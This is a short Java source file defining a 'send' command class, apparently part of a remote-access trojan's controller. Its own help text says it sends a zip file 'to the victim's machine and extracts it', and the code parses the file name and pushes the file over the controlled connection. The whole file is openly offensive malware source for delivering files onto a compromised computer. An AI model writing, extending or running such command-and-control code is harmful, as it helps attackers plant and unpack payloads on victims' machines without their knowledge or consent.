package commands;

import java.io.File;
import java.io.IOException;

import connection.Connection;
import connection.Server;

public class SendCommand extends Command{
	private String _fileName;
	private String _command;
	
	public SendCommand() {
		super("send", "\"file.zip\"", "sends the specified zip file to the victim's machine and extracts it");
	}

	protected boolean parse(String command) {
		boolean ok = false;
		
		if(command.contains(_commandName)) {
			_command = command;
			_fileName = command.split("\"")[1];
			ok = true;
		}
		
		return ok;
	}
	
	@Override
	public void execute(Connection con, Server server) throws IOException, InterruptedException {
		File fileToSend = new File(_fileName);
		
		if(fileToSend.exists()) {
			System.out.println(con.send(_command));
			server.sendFile(fileToSend);
		}
		else {
			System.out.println("File not found");
		}
	}

}
